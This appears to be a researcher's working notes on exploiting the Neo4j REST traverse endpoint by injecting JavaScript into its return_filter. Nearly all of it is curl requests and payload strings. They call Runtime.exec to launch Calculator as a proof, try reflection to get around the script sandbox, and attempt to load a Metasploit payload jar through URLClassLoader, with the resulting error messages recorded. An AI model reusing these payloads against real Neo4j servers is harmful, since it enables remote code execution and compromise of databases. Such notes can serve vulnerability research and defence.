
# Create a node
:POST /db/data/node {}
:PUT /db/data/node/1/properties/name "Alvaro"
:GET /db/data/node/1

:POST /db/data/node/2/traverse/node { "order" : "breadth_first", "return_filter" : { "body" : "position.endNode().getProperty('name').toLowerCase().contains('a')", "language" : "javascript" }, "prune_evaluator" : { "body" : "position.length() > 10", "language" : "javascript" }, "uniqueness" : "node_global", "relationships" : [], "max_depth" : 1}

:POST /db/data/node/2/traverse/node { "order" : "breadth_first", "return_filter" : { "body" : "new java.lang.String('test').contains('t')", "language" : "javascript" }, "prune_evaluator" : { "body" : "position.length() > 10", "language" : "javascript" }, "uniqueness" : "node_global", "relationships" : [], "max_depth" : 1}

:POST /db/data/node/2/traverse/node { "order" : "breadth_first", "return_filter" : { "body" : "new java.lang.Runtime.getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')", "language" : "javascript" }, "prune_evaluator" : { "body" : "position.length() > 10", "language" : "javascript" }, "uniqueness" : "node_global", "relationships" : [], "max_depth" : 1}


# Test
position.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('/Applications/Calculator.app/Contents/MacOS/Calculator')

curl -X POST  http://localhost:7474/db/data/node/2/traverse/node -H "Content-Type: application/json" -d '{ "order" : "breadth_first", "return_filter" : { "body" : "new java.lang.String(\"test\").contains(\"t\")", "language" : "javascript" }, "prune_evaluator" : { "body" : "position.length() > 10", "language" : "javascript" }, "uniqueness" : "node_global", "relationships" : [], "max_depth" : 1}'

# Direct access to Runtime
new java.lang.Runtime.getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')

curl -X POST  http://localhost:7474/db/data/node/2/traverse/node -H "Content-Type: application/json" -d '{ "order" : "breadth_first", "return_filter" : { "body" : "new java.lang.Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")", "language" : "javascript" }, "prune_evaluator" : { "body" : "position.length() > 10", "language" : "javascript" }, "uniqueness" : "node_global", "relationships" : [], "max_depth" : 1}'

"TypeError: [JavaPackage java.lang.Runtime.getRuntime] is not a function, it is object."

# Reflection way 1
position['class'].forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('/Applications/Calculator.app/Contents/MacOS/Calculator')

curl -X POST  http://localhost:7474/db/data/node/2/traverse/node -H "Content-Type: application/json" -d '{ "order" : "breadth_first", "return_filter" : { "body" : "position.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")", "language" : "javascript" }, "prune_evaluator" : { "body" : "position.length() > 10", "language" : "javascript" }, "uniqueness" : "node_global", "relationships" : [], "max_depth" : 1}'

"message" : "Access to Java class \"java.lang.Class\" is prohibited."

# Reflection way 2
curl -X POST  http://localhost:7474/db/data/node/2/traverse/node -H "Content-Type: application/json" -d '{ "order" : "breadth_first", "return_filter" : { "body" : "position[\"class\"].forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")", "language" : "javascript" }, "prune_evaluator" : { "body" : "position.length() > 10", "language" : "javascript" }, "uniqueness" : "node_global", "relationships" : [], "max_depth" : 1}'

"message" : "Access to Java class \"java.lang.Class\" is prohibited."

# URLClassLoader
new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")}).loadClass("metasploit.Payload").newInstance()
new URLClassLoader(new URL[]{new URL(\"http://localhost/~alvaro/met.jar\")}).loadClass(\"metasploit.Payload\").newInstance()

curl -X POST  http://localhost:7474/db/data/node/2/traverse/node -H "Content-Type: application/json" -d '{ "order" : "breadth_first", "return_filter" : { "body" : "var str = new java.lang.String(\"http://localhost/~alvaro/met.jar\");var url = new java.net.URL(str); var array = [url]; var cl = new java.lang.URLClassLoader(array);true", "language" : "javascript" }, "prune_evaluator" : { "body" : "position.length() > 10", "language" : "javascript" }, "uniqueness" : "node_global", "relationships" : [], "max_depth" : 1}'

TypeError: [JavaPackage java.net.URL] is not a function, it is object.


